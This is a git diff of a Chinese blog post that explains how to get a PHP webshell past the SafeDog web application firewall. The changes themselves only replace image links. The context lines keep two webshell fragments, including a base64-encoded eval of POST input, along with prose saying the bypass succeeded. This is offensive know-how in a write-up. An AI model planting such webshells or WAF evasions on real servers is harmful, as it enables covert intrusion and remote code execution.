@@ -40,25 +40,25 @@ $___Ss($_POST['username']);
 
 首先我们在WAF开启的情况下直接连接：
 
-![添加Shell](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x00.png)
+![添加Shell](../../../static/images/e164371e-4f5e-11ec-93c0-00d861bf4abb.png)
 
 接着为了方便分析，我们为当前条目添加上一个代理，通过`Burp`来分析与服务器端木马的交互数据。
 
-![添加代理](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x01.png)
+![添加代理](../../../static/images/e19bdd72-4f5e-11ec-8cbf-00d861bf4abb.png)
 
 双击进行连接后，数据包到了我们的Burp中：
 
-![分析数据](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x02.png)
+![分析数据](../../../static/images/e1d6cf5e-4f5e-11ec-9abf-00d861bf4abb.png)
 
 可以看到已经被`WAF`拦截了：
 
-![拦截截图](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x03.png)
+![拦截截图](../../../static/images/e21c3256-4f5e-11ec-a572-00d861bf4abb.png)
 
 那么我们深知，手工的话是不会被拦截的，为什么呢？
 
 手工截图：
 
-![手工](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x05.png)
+![手工](../../../static/images/e25bcc72-4f5e-11ec-9a98-00d861bf4abb.png)
 
 ## 0x02 站在WAF的角度考虑
 
@@ -145,13 +145,13 @@ $___Ss(base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFthY3Rpb25dKSk=');
 
 此时更改好后我们去try一下 ～
 
-![Success](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x06.png)
+![Success](../../../static/images/e29ddd92-4f5e-11ec-82da-00d861bf4abb.png)
 
 看来已经成功了。
 
 查看进程：
 
-![Command](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x07.png)
+![Command](../../../static/images/e2dc09b4-4f5e-11ec-90be-00d861bf4abb.png)
 
 图中选中的进程`SafeDogSiteApache.exe`，就是WAF了，一切都没有拦截。
 
